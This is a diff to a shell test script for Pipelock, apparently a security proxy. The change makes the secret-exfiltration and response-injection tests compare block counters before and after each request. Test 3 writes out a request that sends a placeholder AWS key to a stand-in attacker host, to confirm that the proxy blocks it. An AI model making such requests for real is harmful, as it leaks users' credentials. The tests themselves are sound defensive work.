@@ -50,31 +50,43 @@ else
   fail "Pipelock did not proxy the request (response: $RESP)"
 fi
 
+# scanner_count <stats-json> <scanner-name>: the cumulative block count for one
+# scanner, or 0 when it has never fired. Used to prove a request CAUSED a block
+# rather than merely coinciding with an earlier one.
+scanner_count() {
+  printf '%s' "$1" |
+    tr '{' '\n' |
+    grep -F "\"name\":\"$2\"" |
+    sed -n 's/.*"count":\([0-9]\{1,\}\).*/\1/p' |
+    head -1 |
+    grep -E '^[0-9]+$' || printf '0'
+}
+
 # -- Test 3: DLP catches secret exfiltration -----------------------------------
 step "Test 3: DLP blocks secret in URL"
 # AWS key split at regex boundary to avoid CI self-scan false positive.
 # wget -S prints HTTP status to stderr; blocked requests return 403.
 DLP_URL="$ATTACKER/?key=AKIA""IOSFODNN7EXAMPLE"
+DLP_BEFORE=$(scanner_count "$(wget -q -T 10 -O - "$PIPELOCK/stats" 2>/dev/null)" core_dlp)
 DLP_HEADERS=$(wget -S -T 10 -O /dev/null "$PIPELOCK/fetch?url=$DLP_URL" 2>&1) || true
-DLP_STATS=$(wget -q -T 10 -O - "$PIPELOCK/stats" 2>/dev/null) || true
-if printf '%s' "$DLP_HEADERS" | grep -q '403' &&
-  printf '%s' "$DLP_STATS" | grep -Fq '"name":"core_dlp"'; then
-  pass "DLP blocked AWS key in URL (HTTP 403)"
+DLP_AFTER=$(scanner_count "$(wget -q -T 10 -O - "$PIPELOCK/stats" 2>/dev/null)" core_dlp)
+if printf '%s' "$DLP_HEADERS" | grep -q '403' && [ "$DLP_AFTER" -gt "$DLP_BEFORE" ]; then
+  pass "DLP blocked AWS key in URL (HTTP 403, core_dlp $DLP_BEFORE -> $DLP_AFTER)"
 else
-  fail "DLP did not block the secret (headers: $DLP_HEADERS, stats: $DLP_STATS)"
+  fail "DLP did not block the secret (headers: $DLP_HEADERS, core_dlp $DLP_BEFORE -> $DLP_AFTER)"
 fi
 
 # -- Test 4: Response injection blocked -----------------------------------------
 step "Test 4: Response scanning blocks injection"
 # With action=block, pipelock returns HTTP 403 when injection is detected.
 # wget -S prints HTTP status to stderr; we check for 403 just like Test 3.
+INJ_BEFORE=$(scanner_count "$(wget -q -T 10 -O - "$PIPELOCK/stats" 2>/dev/null)" response_scan)
 INJ_HEADERS=$(wget -S -T 10 -O /dev/null "$PIPELOCK/fetch?url=$ATTACKER/" 2>&1) || true
-INJ_STATS=$(wget -q -T 10 -O - "$PIPELOCK/stats" 2>/dev/null) || true
-if printf '%s' "$INJ_HEADERS" | grep -q '403' &&
-  printf '%s' "$INJ_STATS" | grep -Fq '"name":"response_scan"'; then
-  pass "Response injection blocked (HTTP 403)"
+INJ_AFTER=$(scanner_count "$(wget -q -T 10 -O - "$PIPELOCK/stats" 2>/dev/null)" response_scan)
+if printf '%s' "$INJ_HEADERS" | grep -q '403' && [ "$INJ_AFTER" -gt "$INJ_BEFORE" ]; then
+  pass "Response injection blocked (HTTP 403, response_scan $INJ_BEFORE -> $INJ_AFTER)"
 else
-  fail "Response injection not blocked (headers: $INJ_HEADERS, stats: $INJ_STATS)"
+  fail "Response injection not blocked (headers: $INJ_HEADERS, response_scan $INJ_BEFORE -> $INJ_AFTER)"
 fi
 
 # -- Test 5: MCP tool poisoning detected ---------------------------------------
